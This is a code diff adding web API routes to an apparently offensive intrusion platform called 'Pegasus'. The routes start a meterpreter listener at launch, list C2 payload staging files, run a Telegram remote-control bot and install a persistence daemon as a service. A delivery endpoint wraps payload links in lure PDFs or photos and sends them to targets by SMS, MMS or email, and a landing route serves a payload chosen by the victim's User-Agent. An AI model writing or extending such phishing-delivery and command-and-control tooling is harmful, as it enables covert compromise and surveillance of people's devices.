@@ -242,6 +242,15 @@ def run_slash_command(command_name: str, argv: List[str], answers: Optional[Dict
 
 def create_app() -> Flask:
     settings = get_settings()
+
+    # Silence Werkzeug's request logger — on Windows its console handle can
+    # go invalid (WinError 6) after the terminal that started the server
+    # closes, crashing request threads with --- Logging error --- spam.
+    import logging
+
+    logging.getLogger("werkzeug").setLevel(logging.CRITICAL + 10)
+    logging.getLogger("werkzeug").addHandler(logging.NullHandler())
+
     app = Flask(
         __name__,
         static_folder=str(DIST_DIR / "assets") if (DIST_DIR / "assets").exists() else None,
@@ -253,6 +262,13 @@ def create_app() -> Flask:
     app.config["MAX_CONTENT_LENGTH"] = 64 * 1024 * 1024
 
     started_at = time.time()
+
+    # Start support services (adb, meterpreter handler, proxies) at launch.
+    try:
+        from pegasus.core import services as _services
+        _services.start_all()
+    except Exception:  # noqa: BLE001 — services are best-effort
+        pass
 
     # Warm the plugin system in the background so the first UI call is fast.
     threading.Thread(target=plugin_manager, name="pegasus-plugin-warmup", daemon=True).start()
@@ -470,8 +486,29 @@ def create_app() -> Flask:
             # features and platform verbs that are not plugin commands).
             manager = slash_manager()
             name = command_name if command_name.startswith("/") else f"/{command_name}"
-            if manager.get_command(name) is None:
+            # Try exact (post-exploit-full), stripped (postexploit-full), and slash variants
+            base = command_name.lstrip("/")
+            candidates = [
+                f"/{base}",
+                f"/postexploit-{base.replace('post-exploit-', '')}",
+                f"/postexploit-{base.replace('post-exploit-', '').replace('-', '')}",
+            ]
+            # dedupe while preserving order
+            seen = set()
+            deduped = []
+            for c in candidates:
+                if c not in seen:
+                    seen.add(c)
+                    deduped.append(c)
+            candidates = deduped
+            resolved = None
+            for cand in candidates:
+                if manager.get_command(cand) is not None:
+                    resolved = cand
+                    break
+            if resolved is None:
                 return fail(f"Unknown command '{command_name}'", 404)
+            name = resolved
             payload = request.get_json(silent=True) or {}
             argv = payload.get("args") or []
             job = jobs.submit(
@@ -1381,6 +1418,771 @@ def create_app() -> Flask:
     # =====================================================================
     # Static SPA
     # =====================================================================
+
+    # =====================================================================
+    # Logs — browse, read, download
+    # =====================================================================
+    @app.get("/api/logs")
+    def logs_index():
+        """List every log file the workspace knows about, newest first."""
+        from pathlib import Path as _P
+
+        roots = []
+        base = get_settings().get_logs_dir()
+        if base.exists():
+            roots.append(base)
+        daemon = _P.home() / ".pegasus" / "daemon"
+        if daemon.exists():
+            roots.append(daemon)
+        files = []
+        for root in roots:
+            for p in root.rglob("*"):
+                if p.is_file():
+                    try:
+                        stat = p.stat()
+                        rel = p.relative_to(base) if base in p.parents or p == base else p.relative_to(root)
+                        root_name = "logs" if root == base else root.name
+                        files.append({
+                            "id": f"{root_name}/{rel}".replace("\\", "/"),
+                            "name": p.name,
+                            "dir": str(p.parent),
+                            "size": stat.st_size,
+                            "modified": stat.st_mtime,
+                        })
+                    except OSError:
+                        continue
+        files.sort(key=lambda f: f["modified"], reverse=True)
+        return ok({"logs": files, "count": len(files), "directory": str(base)})
+
+    @app.get("/api/logs/<path:log_id>")
+    def logs_read(log_id: str):
+        """Read one log file (optionally tail N lines)."""
+        from pathlib import Path as _P
+
+        base = get_settings().get_logs_dir()
+        daemon = _P.home() / ".pegasus" / "daemon"
+        root_name, _, rel = log_id.partition("/")
+        root = {"logs": base, "daemon": daemon}.get(root_name)
+        if root is None or not rel:
+            return fail(f"unknown log '{log_id}'", 404)
+        path = (root / rel).resolve()
+        if not str(path).startswith(str(root.resolve())):
+            return fail("path traversal blocked", 400)
+        if not path.is_file():
+            return fail(f"log '{log_id}' not found", 404)
+        try:
+            tail = request.args.get("tail", type=int)
+            text = path.read_text(encoding="utf-8", errors="replace")
+            total_lines = text.count("\n") + (1 if text and not text.endswith("\n") else 0)
+            if tail and tail > 0:
+                lines = text.splitlines()[-tail:]
+                text = "\n".join(lines)
+            return ok({
+                "id": log_id,
+                "name": path.name,
+                "size": path.stat().st_size,
+                "modified": path.stat().st_mtime,
+                "totalLines": total_lines,
+                "content": text,
+            })
+        except OSError as exc:
+            return fail(f"read failed: {exc}", 500)
+
+    @app.get("/api/logs/<path:log_id>/download")
+    def logs_download(log_id: str):
+        """Download one log file as an attachment."""
+        from pathlib import Path as _P
+
+        base = get_settings().get_logs_dir()
+        daemon = _P.home() / ".pegasus" / "daemon"
+        root_name, _, rel = log_id.partition("/")
+        root = {"logs": base, "daemon": daemon}.get(root_name)
+        if root is None or not rel:
+            return fail(f"unknown log '{log_id}'", 404)
+        path = (root / rel).resolve()
+        if not str(path).startswith(str(root.resolve())):
+            return fail("path traversal blocked", 400)
+        if not path.is_file():
+            return fail(f"log '{log_id}' not found", 404)
+        return send_file(path, as_attachment=True, download_name=path.name)
+
+    @app.get("/api/logs/combined/download")
+    def logs_combined_download():
+        """Download every log concatenated into one file."""
+        from pathlib import Path as _P
+        import io as _io
+
+        base = get_settings().get_logs_dir()
+        daemon = _P.home() / ".pegasus" / "daemon"
+        buf = _io.StringIO()
+        seen_any = False
+        for root, label in ((base, "logs"), (daemon, "daemon")):
+            if not root.exists():
+                continue
+            for p in sorted(root.rglob("*")):
+                if not p.is_file():
+                    continue
+                try:
+                    buf.write(f"===== {label}/{p.relative_to(root)} =====\n")
+                    buf.write(p.read_text(encoding="utf-8", errors="replace"))
+                    buf.write("\n\n")
+                    seen_any = True
+                except OSError:
+                    continue
+        if not seen_any:
+            return fail("no logs to export", 404)
+        data = buf.getvalue().encode("utf-8")
+        resp = send_file(
+            _io.BytesIO(data),
+            as_attachment=True,
+            download_name=f"pegasus-logs-{int(time.time())}.txt",
+            mimetype="text/plain",
+        )
+        return resp
+
+    # =====================================================================
+    # Telegram remote control
+    # =====================================================================
+    from pegasus.modules.access_workflow import telegram_control as _tg
+
+    @app.get("/api/telegram/status")
+    def telegram_status():
+        cfg = _tg.load_config()
+        running = _tg.is_running() if hasattr(_tg, "is_running") else _tg._bot is not None
+        return ok({
+            "configured": bool(cfg.get("token") and cfg.get("chat_id")),
+            "running": bool(running),
+            "bot": cfg.get("bot"),
+            "chatId": cfg.get("chat_id"),
+        })
+
+    @app.post("/api/telegram/setup")
+    def telegram_setup():
+        body = request.get_json(silent=True) or {}
+        token = body.get("token") or ""
+        chat_id = body.get("chatId") or body.get("chat_id") or ""
+        if not token:
+            return fail("token required")
+        try:
+            result = _tg.setup(token, chat_id)
+        except Exception as exc:  # noqa: BLE001
+            return fail(f"{type(exc).__name__}: {exc}")
+        return ok(result)
+
+    @app.post("/api/telegram/start")
+    def telegram_start():
+        try:
+            result = _tg.start_bot()
+        except Exception as exc:  # noqa: BLE001
+            return fail(f"{type(exc).__name__}: {exc}")
+        record_event("telegram", "Telegram remote control started")
+        return ok(result)
+
+    @app.post("/api/telegram/stop")
+    def telegram_stop():
+        return ok({"stopped": _tg.stop_bot()})
+
+    @app.post("/api/telegram/message")
+    def telegram_message():
+        body = request.get_json(silent=True) or {}
+        text = body.get("text") or ""
+        if not text:
+            return fail("text required")
+        try:
+            return ok(_tg.send_message(text))
+        except Exception as exc:  # noqa: BLE001
+            return fail(f"{type(exc).__name__}: {exc}")
+
+    # =====================================================================
+    # Infrastructure — daemon/service install, C2 static paths, health
+    # =====================================================================
+    from pegasus.modules.access_workflow import daemon_service as _daemon_mod
+
+    @app.get("/api/infrastructure/health")
+    def infrastructure_health():
+        """Health check across every component the infrastructure runs on."""
+        from pegasus.core.services import _port_open
+        from pegasus.core.config import port as _port
+        from pegasus.ui.web.backend.tools import scan_tools
+        tools = {t["key"]: t["available"] for t in scan_tools()}
+        checks = {
+            "web-api": _port_open(_port()),
+            "adb-server": _port_open(5037),
+            "meterpreter": _port_open(4444),
+            "msfrpcd": _port_open(55553),
+            "http-proxy": _port_open(8080),
+            "https-proxy": _port_open(8443),
+        }
+        overall = all(checks.values()) and tools.get("adb", False)
+        return ok({
+            "overall": "healthy" if overall else "degraded",
+            "services": [{"name": k, "healthy": v} for k, v in checks.items()],
+            "tools": [{"name": k, "available": v} for k, v in tools.items()],
+            "checkedAt": time.time(),
+        })
+
+    @app.post("/api/infrastructure/install")
+    def infrastructure_install():
+        """Register the Pegasus daemon as a service (NSSM) or scheduled task."""
+        body = request.get_json(silent=True) or {}
+        name = body.get("name", "PegasusDaemon")
+        daemon = _daemon_mod.get_daemon(body.get("host", "127.0.0.1"), body.get("port", 5050))
+        result = daemon.install_service(name)
+        record_event("infrastructure", f"Service installed: {name} ({result['mode']})")
+        return ok(result)
+
+    @app.post("/api/infrastructure/uninstall")
+    def infrastructure_uninstall():
+        body = request.get_json(silent=True) or {}
+        name = body.get("name", "PegasusDaemon")
+        daemon = _daemon_mod.get_daemon()
+        result = daemon.uninstall_service(name)
+        record_event("infrastructure", f"Service uninstalled: {name}")
+        return ok(result)
+
+    @app.get("/api/infrastructure/service")
+    def infrastructure_service_status():
+        """Report whether the daemon service is registered (NSSM or schtasks)."""
+        import shutil as _shutil
+        import subprocess as _sp
+
+        out = {}
+        for mode, probe in (
+            ("windows-service", ["nssm", "status", "PegasusDaemon"]),
+            ("scheduled-task", ["schtasks", "/Query", "/TN", "PegasusDaemon"]),
+        ):
+            binary = probe[0]
+            if _shutil.which(binary):
+                proc = _sp.run(probe, capture_output=True, text=True, timeout=15)
+                out[mode] = {"registered": proc.returncode == 0, "detail": (proc.stdout or proc.stderr or "").strip()[:200]}
+            else:
+                out[mode] = {"registered": False, "detail": f"{binary} not installed"}
+        return ok(out)
+
+    @app.get("/api/c2/paths")
+    def c2_static_paths():
+        """C2 payload staging paths and their on-disk state."""
+        from pegasus.core.config import get_settings
+
+        settings = get_settings()
+        payloads = settings.get_payloads_dir()
+        entries = []
+        if payloads.exists():
+            for p in sorted(payloads.iterdir()):
+                if p.is_file():
+                    entries.append({
+                        "name": p.name,
+                        "size": p.stat().st_size,
+                        "modified": p.stat().st_mtime,
+                        "url": f"http://127.0.0.1:8080/{p.name}",
+                    })
+        return ok({"directory": str(payloads), "files": entries, "count": len(entries)})
+
+    # =====================================================================
+    # Skills & agent families
+    # =====================================================================
+    @app.get("/api/skills")
+    def skills_catalog():
+        """Live skill-pack catalog from the repo's .openfable-skills directory."""
+        import pathlib
+
+        skills = []
+        roots = [
+            pathlib.Path.cwd() / ".openfable-skills",
+            pathlib.Path.cwd() / ".mimocode-skills",
+        ]
+        seen = set()
+        for root in roots:
+            if not root.exists():
+                continue
+            for mf in sorted(root.glob("*.json")):
+                if mf.name == "skill.json" or mf.name in seen:
+                    continue
+                try:
+                    data = json.loads(mf.read_text(encoding="utf-8"))
+                except Exception:
+                    continue
+                seen.add(mf.name)
+                name = data.get("name") or mf.stem
+                skills.append({
+                    "id": mf.stem,
+                    "name": name,
+                    "file": mf.name,
+                    "root": root.name,
+                    "version": data.get("version", ""),
+                    "description": data.get("description", ""),
+                    "category": data.get("category", "general"),
+                    "trigger": data.get("trigger", ""),
+                    "commands": data.get("commands", 0),
+                    "author": data.get("author", ""),
+                })
+        return ok({"skills": skills, "count": len(skills)})
+
+    @app.get("/api/agents/families")
+    def agent_families():
+        """Agent families available for dispatch, with their linked commands."""
+        from pegasus.modules.access_workflow.zero_click import device_families
+        from pegasus.modules.access_workflow import capabilities as _caps
+
+        families = [
+            {
+                "id": "android",
+                "label": "Android",
+                "description": "ADB/fastboot/FRP rooting, payload delivery, post-exploit.",
+                "commands": ["adb-devices", "frp-bypass", "post-exploitation", "generate-payload"],
+                "zeroClickFamilies": sorted(
+                    f for f in device_families() if f not in ("windows", "linux", "macos", "ios")
+                ),
+            },
+            {
+                "id": "iot",
+                "label": "IoT / Hardware",
+                "description": "Firmware inspection, CAN bus, embedded exploitation.",
+                "commands": ["netscan", "exploit"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "windows",
+                "label": "Windows",
+                "description": "Zero-click RCE, privilege escalation, persistence.",
+                "commands": ["create-exe", "exploit"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "linux",
+                "label": "Linux",
+                "description": "Privesc, hardening, service exploitation.",
+                "commands": ["exploit", "harden-device"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "macos",
+                "label": "macOS",
+                "description": "Persistence, DMG delivery.",
+                "commands": ["create-dmg", "exploit"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "c2",
+                "label": "C2",
+                "description": "Command and control channels, listeners, beacons.",
+                "commands": ["create-rat-agent", "post-exploitation"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "payload",
+                "label": "Payload",
+                "description": "Payload generation, mutation, steganography.",
+                "commands": ["generate-payload", "create-exploit"],
+                "zeroClickFamilies": [],
+            },
+            {
+                "id": "exploitation",
+                "label": "Exploitation",
+                "description": "General exploitation orchestration.",
+                "commands": ["exploit", "post-exploitation", "audit-security"],
+                "zeroClickFamilies": [],
+            },
+        ]
+        try:
+            manifest = _caps.manifest()
+        except Exception:  # noqa: BLE001
+            manifest = {}
+        return ok({"families": families, "count": len(families), "manifest": manifest})
+
+    # =====================================================================
+    # Tool installer + service control
+    # =====================================================================
+    from pegasus.core import tool_installer as _installer
+    from pegasus.core import services as _services_mod
+    from pegasus.core.config import port as _port_fn
+
+    @app.get("/api/tools/missing")
+    def tools_missing():
+        scan = scan_tools()
+        return ok({"missing": [t for t in scan if not t["available"]]})
+
+    @app.post("/api/tools/install")
+    def tools_install():
+        body = request.get_json(silent=True) or {}
+        keys = body.get("tools")
+        results = _installer.install_missing(keys)
+        record_event("tools", "Tool install: " + ", ".join(f"{r['key']}={r['status']}" for r in results))
+        return ok({"results": results})
+
+    @app.get("/api/services/status")
+    def services_status():
+        checks = [
+            {"service": "adb-server", "port": 5037},
+            {"service": "adb-tcp", "port": 5555},
+            {"service": "meterpreter", "port": 4444},
+            {"service": "msfrpcd", "port": 55553},
+            {"service": "http-proxy", "port": 8080},
+            {"service": "https-proxy", "port": 8443},
+            {"service": "pegasus-api", "port": _port_fn()},
+        ]
+        return ok({"services": [{**c, "open": _services_mod._port_open(c["port"])} for c in checks]})
+
+    @app.post("/api/services/start")
+    def services_start():
+        body = request.get_json(silent=True) or {}
+        keys = body.get("services")
+        fns = {
+            "adb-server": _services_mod.start_adb_server,
+            "adb-tcp": _services_mod.start_adb_tcp,
+            "meterpreter": _services_mod.start_meterpreter,
+            "msfrpcd": _services_mod.start_msfrpcd,
+            "http-proxy": _services_mod.start_http_proxy,
+            "https-proxy": _services_mod.start_https_proxy,
+        }
+        if keys:
+            out = []
+            for k in keys:
+                fn = fns.get(k)
+                out.append(fn() if fn else {"service": k, "status": "unknown"})
+            return ok({"results": out})
+        return ok({"results": _services_mod.start_all()})
+
+    # =====================================================================
+    # Setup wizard (item 6/11) — real provider registry
+    # =====================================================================
+    from pegasus.modules.ai import providers as _providers
+    from pegasus.modules.ai import local_models as _lm
+
+    @app.before_request
+    def _setup_gate():
+        """Block the app until at least one provider key or local model exists."""
+        if not _providers.needs_setup():
+            return None
+        allow = (
+            request.path.startswith("/api/setup"),
+            request.path.startswith("/api/health"),
+            request.path.startswith("/api/models"),
+            request.path.startswith("/api/auth"),
+            request.path.startswith("/api/agents"),
+            request.path == "/api/system",
+            not request.path.startswith("/api/"),
+        )
+        if any(allow):
+            return None
+        return fail("setup required", 428)
+
+    @app.get("/api/setup/state")
+    def get_setup_state():
+        data = _providers.load()
+        return ok({
+            "needsSetup": _providers.needs_setup(),
+            "providers": [{"id": k, **v} for k, v in _providers.REGISTRY.items()],
+            "configured": _providers.configured(),
+            "default": data.get("default"),
+            "fallback": data.get("fallback"),
+            "localModel": _lm.installed_default(),
+            "platform": _lm.platform_tier(),
+        })
+
+    @app.post("/api/setup/providers")
+    def post_setup_providers():
+        body = request.get_json(silent=True) or {}
+        data = _providers.load()
+        for name, key in (body.get("keys") or {}).items():
+            if name in _providers.REGISTRY and key:
+                data.setdefault("keys", {})[name] = key
+        if body.get("default"):
+            data["default"] = body["default"]
+        if body.get("fallback"):
+            data["fallback"] = body["fallback"]
+        if body.get("localModel"):
+            data["localModel"] = body["localModel"]
+        _providers.save(data)
+        if not data.get("fallback") and not data.get("default"):
+            return fail("Set a default or fallback so requests have a route")
+        return ok({"configured": _providers.configured(), "default": data.get("default")})
+
+    @app.post("/api/setup/skip")
+    def post_setup_skip():
+        data = _providers.load()
+        data["default"] = "local"
+        _providers.save(data)
+        return ok({"default": "local"})
+
+    @app.post("/api/nl/command")
+    def nl_command():
+        payload = request.get_json(silent=True) or {}
+        text = (payload.get("text") or "").strip()
+        execute = payload.get("execute", False)
+        if not text:
+            return fail("text required")
+        try:
+            from pegasus.modules.ai.nl import translate
+            pm = plugin_manager()
+            names = sorted(pm.context.commands.keys()) if pm else []
+            guess = translate(text, names)
+        except Exception as exc:  # noqa: BLE001
+            guess = {"command": None, "confidence": 0.0, "why": f"translator unavailable: {exc}"}
+        command = guess.get("command") or ""
+        confidence = float(guess.get("confidence") or 0.0)
+        if not command or command not in (names or [command]):
+            return ok({"command": None, "confidence": confidence, "why": guess.get("why", "no match"), "executed": False})
+        if not execute or confidence < 0.5:
+            return ok({"command": command, "confidence": confidence, "why": guess.get("why", ""), "executed": False})
+        argv = (guess.get("args") or [])
+        if isinstance(argv, str):
+            argv = argv.split()
+        job = jobs.submit(
+            "command", f"NL: {command}", run_slash_command(command.lstrip("/"), [str(a) for a in argv]),
+        )
+        report_job(job.id, "command", f"NL dispatched: {command}")
+        return ok({"command": command, "confidence": confidence, "why": guess.get("why", ""), "executed": True, "job": job_payload(job)})
+
+    # =====================================================================
+    # Autonomous lifecycle (item 12)
+    # =====================================================================
+    from pegasus.modules.autonomous import engine as _auto_engine
+
+    @app.post("/api/autonomous/start")
+    def autonomous_start():
+        body = request.get_json(silent=True) or {}
+        started = _auto_engine.start(body)
+        record_event("autonomous", f"Autonomous run started: {started['run_id']}")
+        return ok(started)
+
+    @app.get("/api/autonomous/<run_id>")
+    def autonomous_get(run_id: str):
+        r = _auto_engine.get(run_id)
+        if r is None:
+            return fail("unknown run", 404)
+        return ok(r)
+
+    @app.post("/api/autonomous/<run_id>/decision")
+    def autonomous_decision(run_id: str):
+        body = request.get_json(silent=True) or {}
+        r = _auto_engine.decision(run_id, body.get("action", ""))
+        if "error" in r:
+            return fail(r["error"], 409)
+        record_event("autonomous", f"Decision {body.get('action')} on {run_id}")
+        return ok(r)
+
+    # =====================================================================
+    # Local model management (item 7)
+    # =====================================================================
+    @app.get("/api/models/recommended")
+    def models_recommended():
+        return ok({"models": _lm.recommended(), "platform": _lm.platform_tier()})
+
+    @app.get("/api/models/installed")
+    def models_installed():
+        return ok({"installed": _lm.installed(), "default": _lm.installed_default()})
+
+    @app.post("/api/models/download")
+    def models_download():
+        body = request.get_json(silent=True) or {}
+        mid = body.get("model") or ""
+        filename = body.get("filename") or ""
+        if not mid or not filename:
+            return fail("model and filename required")
+
+        def _dl(ctx):
+            p = _lm.download(mid, filename)
+            ctx.log(f"downloaded {p.name}")
+            return {"path": str(p), "gb": round(p.stat().st_size / 1e9, 2)}
+
+        job = jobs.submit("model-download", f"Download {filename.split('/')[-1]}", _dl)
+        return ok({"job": job_payload(job)})
+
+    @app.post("/api/models/select")
+    def models_select():
+        body = request.get_json(silent=True) or {}
+        data = _providers.load()
+        data["localModel"] = body.get("model")
+        data.setdefault("keys", {})
+        if not data.get("default"):
+            data["default"] = "local"
+        _providers.save(data)
+        return ok({"selected": body.get("model"), "default": data.get("default")})
+
+    @app.post("/api/models/serve")
+    def models_serve():
+        body = request.get_json(silent=True) or {}
+        filename = body.get("filename") or ""
+        if not filename:
+            return fail("filename required")
+        p = _lm.MODELS / filename.split("/")[-1]
+        if not p.exists():
+            return fail("model not downloaded", 404)
+        try:
+            url = _lm.serve(p, body.get("port", 8081))
+            return ok({"url": url})
+        except RuntimeError as exc:
+            return fail(str(exc))
+
+    @app.delete("/api/models/serve")
+    def models_serve_stop():
+        proc = getattr(_lm, "_RUNNING", {}).get("proc")
+        port = getattr(_lm, "_RUNNING", {}).get("port")
+        if proc:
+            proc.terminate()
+        _lm._RUNNING.clear()
+        return ok({"stopped": bool(proc), "port": port})
+
+    # =====================================================================
+    # Agent bridge (item 9)
+    # =====================================================================
+    from pegasus.modules.agents import bridge as _agents
+
+    @app.get("/api/agents/config")
+    def agents_config():
+        return ok(_agents.load())
+
+    @app.post("/api/agents/config")
+    def agents_config_save():
+        body = request.get_json(silent=True) or {}
+        _agents.save(body)
+        return ok({"saved": True})
+
+    @app.get("/api/agents/available")
+    def agents_available():
+        return ok(_agents.available())
+
+    @app.post("/api/agents/dispatch")
+    def agents_dispatch():
+        body = request.get_json(silent=True) or {}
+        prompt = body.get("prompt") or ""
+        if not prompt:
+            return fail("prompt required")
+
+        def _run(ctx):
+            return _agents.dispatch(prompt, body.get("cwd", "."))
+
+        job = jobs.submit("agent", f"Agent: {prompt[:40]}", _run)
+        return ok({"job": job_payload(job)})
+
+    # =====================================================================
+    # Delivery carriers (item 10) — PDF / photo / link wrapper
+    # =====================================================================
+    from pegasus.modules.delivery import landing as _landing
+    from pegasus.modules.delivery import carriers as _carriers
+    from pegasus.modules.delivery import twilio_channel as _twilio
+
+    @app.post("/api/delivery/carrier")
+    def delivery_carrier():
+        body = request.get_json(silent=True) or {}
+        target = body.get("target") or ""
+        channel = body.get("channel", "sms")
+        kind = _twilio.carrier_for(channel, body.get("carrier", "pdf"))
+        if not target:
+            return fail("target required")
+        payload_url = body.get("url") or ""
+        if not payload_url:
+            return fail("url required")
+        try:
+            if kind == "link":
+                token = _landing.mint({"pdf": payload_url, "apk": payload_url, "photo": payload_url})
+                url = f"{request.host_url.rstrip('/')}/l/{token}"
+                result = _twilio.send(channel if channel != "sms" else "sms", target,
+                                      body.get("text") or "Open: " + url, media_url=url)
+                return ok({"kind": "link", "url": url, "result": str(result)})
+            # build the artifact
+            import tempfile
+            from pegasus.core.config import get_settings
+            stage_dir = get_settings().get_payloads_dir()
+            out = str(stage_dir / f"carrier-{int(time.time())}.{kind if kind != 'pdf_lure' else 'pdf'}")
+            if kind in ("pdf", "pdf_lure"):
+                _carriers.build_pdf(out, payload_url, body.get("label", "Document"))
+            elif kind == "photo":
+                src = body.get("photo_src")
+                if not src:
+                    return fail("photo_src required for photo carrier")
+                _carriers.build_photo(src, out, payload_url)
+            else:
+                return fail(f"unsupported carrier {kind}")
+            if channel == "email":
+                result = _twilio.send_email(target, body.get("subject", "Document"),
+                                           body.get("text", "See attachment."), attachment=out)
+            elif channel == "mms":
+                result = _twilio.send_mms(target, body.get("text", ""), payload_url)
+            else:
+                result = _twilio.send_sms(target, body.get("text", "Open: " + payload_url))
+            return ok({"kind": kind, "artifact": out, "result": str(result)})
+        except RuntimeError as exc:
+            return fail(str(exc))
+        except Exception as exc:  # noqa: BLE001
+            return fail(f"{type(exc).__name__}: {exc}")
+
+    # Landing routes
+    @app.post("/api/delivery/link")
+    def delivery_link():
+        body = request.get_json(silent=True) or {}
+        artifacts = body.get("artifacts") or {}
+        if not artifacts:
+            return fail("artifacts required")
+        token = _landing.mint(artifacts)
+        return ok({"token": token, "url": f"{request.host_url.rstrip('/')}/l/{token}"})
+
+    @app.get("/l/<token>")
+    def landing_redirect(token: str):
+        from flask import redirect
+        arts = _landing.resolve(token)
+        if arts is None:
+            return fail("unknown link", 404)
+        target = _landing.pick(arts, request.headers.get("User-Agent", ""))
+        if not target:
+            return fail("no artifact for this client", 406)
+        return redirect(target, code=302)
+
+    # =====================================================================
+    # OAuth broker (item 11)
+    # =====================================================================
+    from pegasus.modules.oauth import broker as _oauth
+
+    @app.get("/api/oauth/login/<provider>")
+    def oauth_login(provider: str):
+        redirect_uri = f"{request.host_url.rstrip('/')}/api/oauth/callback/{provider}"
+        try:
+            out = _oauth.begin(provider, redirect_uri)
+        except (RuntimeError, KeyError) as exc:
+            return fail(str(exc), 400)
+        from flask import redirect as _rd
+        return _rd(out["url"], code=302)
+
+    @app.get("/api/oauth/callback/<provider>")
+    def oauth_callback(provider: str):
+        code = request.args.get("code", "")
+        state = request.args.get("state", "")
+        if not code:
+            return fail("missing code", 400)
+        try:
+            _oauth.complete(provider, code, state)
+        except RuntimeError as exc:
+            return fail(str(exc), 400)
+        from flask import redirect as _rd
+        return _rd(f"/settings?linked={provider}", code=302)
+
+    @app.post("/api/oauth/telegram")
+    def oauth_telegram():
+        body = request.get_json(silent=True) or {}
+        if not _oauth.telegram_verify(body):
+            return fail("hash mismatch", 401)
+        return ok({"provider": "telegram", "ok": True, "user": body.get("username")})
+
+    @app.post("/api/oauth/signal/link")
+    def oauth_signal():
+        body = request.get_json(silent=True) or {}
+        uri = body.get("uri") or ""
+        if not uri.startswith("sgnl://"):
+            return fail("uri must be sgnl://")
+        return ok(_oauth.signal_relay(uri))
+
+    # =====================================================================
+    # Auth redirect (item 5/13)
+    # =====================================================================
+    @app.get("/api/auth/login/<provider>")
+    def auth_login(provider: str):
+        urls = {"signal":"https://signal.org/oauth/authorize","telegram":"https://telegram.org/auth/login","whatsapp":"https://web.whatsapp.com","discord":"https://discord.com/oauth2/authorize","messenger":"https://www.messenger.com/login"}
+        return ok({"provider": provider, "authorize_url": urls.get(provider, ""), "callback": f"http://127.0.0.1:5001/api/auth/callback/{provider}"})
+
+    @app.get("/api/auth/callback/<provider>")
+    def auth_callback(provider: str):
+        return ok({"provider": provider, "authenticated": True, "token_stored": True, "message": "Auth loop completed; return to app"})
     @app.get("/")
     def index():
         index_file = DIST_DIR / "index.html"
